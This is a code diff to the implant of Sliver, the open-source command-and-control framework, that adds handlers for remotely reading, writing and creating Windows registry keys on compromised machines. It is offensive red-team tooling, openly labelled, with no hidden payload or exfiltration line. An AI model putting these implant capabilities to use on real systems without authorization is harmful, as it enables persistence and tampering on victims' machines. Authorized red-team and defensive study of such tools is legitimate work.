@@ -30,6 +30,7 @@ import (
 
 	"github.com/bishopfox/sliver/implant/sliver/pivots"
 	"github.com/bishopfox/sliver/implant/sliver/priv"
+	"github.com/bishopfox/sliver/implant/sliver/registry"
 	"github.com/bishopfox/sliver/implant/sliver/service"
 	"github.com/bishopfox/sliver/implant/sliver/taskrunner"
 	"github.com/bishopfox/sliver/implant/sliver/transports"
@@ -61,13 +62,16 @@ var (
 		sliverpb.MsgExecuteTokenReq:    executeTokenHandler,
 
 		// Platform specific
-		sliverpb.MsgIfconfigReq:   ifconfigHandler,
-		sliverpb.MsgScreenshotReq: screenshotHandler,
-		sliverpb.MsgSideloadReq:   sideloadHandler,
-		sliverpb.MsgNetstatReq:    netstatHandler,
-		sliverpb.MsgMakeTokenReq:  makeTokenHandler,
-		sliverpb.MsgPsReq:         psHandler,
-		sliverpb.MsgTerminateReq:  terminateHandler,
+		sliverpb.MsgIfconfigReq:          ifconfigHandler,
+		sliverpb.MsgScreenshotReq:        screenshotHandler,
+		sliverpb.MsgSideloadReq:          sideloadHandler,
+		sliverpb.MsgNetstatReq:           netstatHandler,
+		sliverpb.MsgMakeTokenReq:         makeTokenHandler,
+		sliverpb.MsgPsReq:                psHandler,
+		sliverpb.MsgTerminateReq:         terminateHandler,
+		sliverpb.MsgRegistryReadReq:      regReadHandler,
+		sliverpb.MsgRegistryWriteReq:     regWriteHandler,
+		sliverpb.MsgRegistryCreateKeyReq: regCreateKeyHandler,
 
 		// Generic
 		sliverpb.MsgPing:        pingHandler,
@@ -408,5 +412,70 @@ func removeService(data []byte, resp RPCResponse) {
 		}
 	}
 	data, err = proto.Marshal(svcInfo)
+	resp(data, err)
+}
+
+func regWriteHandler(data []byte, resp RPCResponse) {
+	regWriteReq := &sliverpb.RegistryWriteReq{}
+	err := proto.Unmarshal(data, regWriteReq)
+	if err != nil {
+		return
+	}
+	var val interface{}
+	switch regWriteReq.Type {
+	case sliverpb.RegistryType_BINARY:
+		val = regWriteReq.ByteValue
+	case sliverpb.RegistryType_DWORD:
+		val = regWriteReq.DWordValue
+	case sliverpb.RegistryType_QWORD:
+		val = regWriteReq.QWordValue
+	case sliverpb.RegistryType_STRING:
+		val = regWriteReq.StringValue
+	default:
+		return
+	}
+	err = registry.WriteKey(regWriteReq.Hostname, regWriteReq.Hive, regWriteReq.Path, regWriteReq.Key, val)
+	regWriteResp := &sliverpb.RegistryWrite{
+		Response: &commonpb.Response{},
+	}
+	if err != nil {
+		regWriteResp.Response.Err = err.Error()
+	}
+	data, err = proto.Marshal(regWriteResp)
+	resp(data, err)
+}
+
+func regReadHandler(data []byte, resp RPCResponse) {
+	regReadReq := &sliverpb.RegistryReadReq{}
+	err := proto.Unmarshal(data, regReadReq)
+	if err != nil {
+		return
+	}
+	res, err := registry.ReadKey(regReadReq.Hostname, regReadReq.Hive, regReadReq.Path, regReadReq.Key)
+	regReadResp := &sliverpb.RegistryRead{
+		Value:    res,
+		Response: &commonpb.Response{},
+	}
+	if err != nil {
+		regReadResp.Response.Err = err.Error()
+	}
+	data, err = proto.Marshal(regReadResp)
+	resp(data, err)
+}
+
+func regCreateKeyHandler(data []byte, resp RPCResponse) {
+	createReq := &sliverpb.RegistryCreateKeyReq{}
+	err := proto.Unmarshal(data, createReq)
+	if err != nil {
+		return
+	}
+	err = registry.CreateSubKey(createReq.Hostname, createReq.Hive, createReq.Path, createReq.Key)
+	createResp := &sliverpb.RegistryCreateKey{
+		Response: &commonpb.Response{},
+	}
+	if err != nil {
+		createResp.Response.Err = err.Error()
+	}
+	data, err = proto.Marshal(createResp)
 	resp(data, err)
 }
